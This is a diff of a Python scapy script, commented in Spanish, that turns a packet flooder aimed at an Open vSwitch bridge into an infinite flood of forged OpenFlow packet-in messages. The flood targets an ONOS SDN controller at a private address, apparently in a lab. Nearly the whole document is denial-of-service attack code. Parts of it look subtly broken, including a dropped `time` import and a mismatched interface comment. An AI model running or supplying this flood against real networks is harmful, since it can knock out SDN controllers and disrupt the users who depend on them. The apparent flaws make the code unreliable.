@@ -1,35 +1,30 @@
-import subprocess
-from scapy.all import Ether, IP, sendp
-import random
-import time
+from scapy.all import *
+from scapy.contrib.openflow import *
 
-# Configura el OVS para enviar todos los paquetes al controlador
-bridge_name = "br0"  # Nombre del puente OVS
-subprocess.run(["ovs-ofctl", "add-flow", bridge_name, "priority=100,actions=controller"])
-
-# Función para generar una dirección MAC aleatoria
-def random_mac():
-    return "02:%02x:%02x:%02x:%02x:%02x" % (
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255)
+def send_packet_in_flood(controller_ip, controller_port, iface):
+    # Crear el mensaje OpenFlow packet-in
+    packet_in = OFPTPacketIn(
+        version=0x04,       # OpenFlow 1.3
+        type=0x0a,          # Type 10 for packet-in
+        xid=0,              # Transaction ID
+        buffer_id=4294967295,  # No buffer
+        total_len=100,      # Longitud total del paquete
+        in_port=1,          # Puerto de entrada
+        reason=0,           # No match
+        data=Raw(b'\x00' * 100)  # Datos arbitrarios (100 bytes de ceros)
     )
 
-# Enviar paquetes al bridge con direcciones MAC de destino aleatorias
-def flood_packets(interface, count):
-    for _ in range(count):
-        pkt = Ether(dst=random_mac()) / IP(dst="10.0.0.1") # GENERAR TRAMA ARP
-        sendp(pkt, iface=interface, verbose=0)
-        time.sleep(0.01)  # Pequeña pausa para no saturar la red inmediatamente
+    # Crear el paquete Ethernet que contiene el mensaje OpenFlow packet-in
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=controller_ip) / TCP(dport=controller_port) / packet_in
 
-# Especifica la interfaz a utilizar
-interface = "eth0"  # Interfaz del sistema que conecta al OVS
+    # Enviar paquetes en un bucle infinito
+    while True:
+        sendp(packet, iface=iface)
+        time.sleep(0.01)  # Controlar la tasa de envío de paquetes (10ms entre cada paquete)
 
-# Número de paquetes a enviar
-packet_count = 1000
 
-print(f"Iniciando envío de {packet_count} paquetes...")
-flood_packets(interface, packet_count)
-print("Envió completo.")
+if __name__ == "__main__":
+    controller_ip = "172.17.0.2"  # IP del controlador ONOS
+    controller_port = 6633         # Puerto del controlador OpenFlow
+    iface = "eth0"              # Cambia "s1-eth1" a la interfaz del switch
+    send_packet_in_flood(controller_ip, controller_port, iface)
